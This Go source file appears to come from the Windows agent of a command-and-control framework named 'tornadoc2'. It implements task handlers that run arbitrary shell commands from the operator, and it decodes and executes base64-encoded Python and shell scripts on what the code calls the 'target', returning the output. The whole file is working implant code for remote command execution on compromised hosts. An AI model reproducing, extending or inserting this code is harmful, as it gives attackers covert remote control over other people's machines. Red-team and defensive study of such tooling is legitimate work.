//go:build windows

package core

import (
	"bytes"
	"context"
	"encoding/base64"
	"os/exec"
	"strings"
	"tornadoc2/agent/protocol"
)

func (a *Agent) shVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID, Error: "sh requires a command"}
	}

	command := strings.Join(t.Args, " ")
	diag("[sh] running command %q\n", command)

	shellPath, shellArgv, stdinBody := shellCommand(command)

	cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
	cmd.Stdin = strings.NewReader(stdinBody)
	cmd.Env = sanitizedEnv()

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out
	err := cmd.Run()
	r := protocol.Result{ID: t.ID, Output: encodeOutput(out.Bytes())}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
		}
	}
	return r
}
func (a *Agent) pyexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "pyexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)

	pythonPath := ""
	for _, candidate := range []string{"python3", "python"} {
		if _, err := exec.LookPath(candidate); err == nil {
			pythonPath = candidate
			break
		}
	}
	if pythonPath == "" {
		return protocol.Result{ID: t.ID,
			Error: "python3/python not found on target"}
	}
	diag("[pyexec] using python=%q script=%d bytes args=%v\n",
		pythonPath, len(src), scriptArgs)

	argv := append([]string{"-"}, scriptArgs...)
	cmd := exec.CommandContext(ctx, pythonPath, argv...)
	cmd.Stdin = strings.NewReader(string(src))
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}
func (a *Agent) shexecVerb(ctx context.Context, t protocol.Task) protocol.Result {
	if len(t.Args) == 0 {
		return protocol.Result{ID: t.ID,
			Error: "shexec requires base64-encoded source as first arg"}
	}

	src, err := base64.StdEncoding.DecodeString(t.Args[0])
	if err != nil {
		return protocol.Result{ID: t.ID,
			Error: "invalid base64 in first arg: " + err.Error()}
	}

	scriptArgs := splitScriptArgs(t.Args)
	diag("[shexec] script=%d bytes args=%v\n", len(src), scriptArgs)

	shellPath, shellArgv, stdinBody := shellScript(string(src), scriptArgs)
	cmd := exec.CommandContext(ctx, shellPath, shellArgv...)
	cmd.Stdin = strings.NewReader(stdinBody)
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err = cmd.Run()
	r := protocol.Result{ID: t.ID}
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			r.ExitCode = ee.ExitCode()
		} else {
			r.Error = err.Error()
			r.Output = encodeOutput(stdout.Bytes())
			return r
		}
	}
	r.Output = encodeOutput(mergeStreams(stdout.Bytes(), stderr.Bytes()))
	return r
}
